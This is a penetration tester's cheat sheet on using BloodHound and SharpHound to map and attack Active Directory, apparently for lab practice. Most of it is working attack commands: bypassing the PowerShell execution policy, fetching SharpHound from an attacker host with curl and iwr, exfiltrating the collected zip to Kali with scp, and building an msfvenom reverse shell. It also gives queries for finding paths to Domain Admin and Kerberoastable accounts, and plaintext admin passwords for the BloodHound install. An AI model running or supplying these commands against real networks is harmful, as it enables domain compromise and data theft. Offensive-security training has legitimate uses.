# BloodHound
- https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
```bash
#### Run collector on Target   ############
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All 
# sharphound.exe -c all -d <domain>
scp *.zip kali@192.168.45.190:~/Documents/Boxes/    # exfil data back to KALI

sudo ./bloodhound-cli up        # Start Bloodhound
http://127.0.0.1:8080/ui/login  # Access in browser, admin : Bloodhound12!@
sudo ./bloodhound-cli containers down  # Stop Bloodhound
```

## Bloodhound Gui
- NOTE: powerview does the same stuff as bloodhound, from CLI
- Raw Query function: at the bottom of the GUI
- MATCH (m:Computer) RETURN m : display all computers
- MATCH (m:User) RETURN m     : display all users
- Mark users you have owned as owned
- Display all domain administrators by using the pre-built 
- Find all Domain Admins query under the Analysis tab.
- General useful pre-built queries
    - Find Workstations where Domain Users can RDP
    - Find Servers where Domain Users can RDP
    - Find Computers where Domain Users are Local Admin
    - Shortest Path to Domain Admins from Owned Principals
    - List all Kerberoastable Accounts pre-built query in BloodHound.

- If you find *Kerberoastable* account, grab **SPN** from account via 'node info' menu
- review active sessions
    - MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
-  build TCP reverse shell with msvenom
- `msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o reverse.exe`

## Collect Data 
```bash
curl.exe http://192.168.45.190/SharpHound.ps1 -o sharphound.ps1
iwr -uri http://192.168.45.190/SharpHound.ps1 -Outfile SharpHound.ps1

# must be run as domain user, not Local Admin

sharphound.exe -c all -d <domain>

powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# once finished, locate .zip file, transfer back to kali
scp *.zip kali@192.168.45.190:~/Documents/Boxes/
```
## Inspect Data
```
# start BloodHound. 
# Once BloodHound is started, we'll upload the zip archive with the _Upload Data_ function
http://127.0.0.1:8080/
```

## Install
```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install

# “Docker is installed on this system, but the daemon is not running” In case you get the error message, you need to uninstall and re-install Docker.
# Simply launch Docker Desktop and proceed.
sudo systemctl start docker    
sudo /opt/bloodhound-cli install

[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: ucMBeGC75nRmTE7b2sMK4LpGHBw7jmWG
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
 
Bloodhound12!@

```
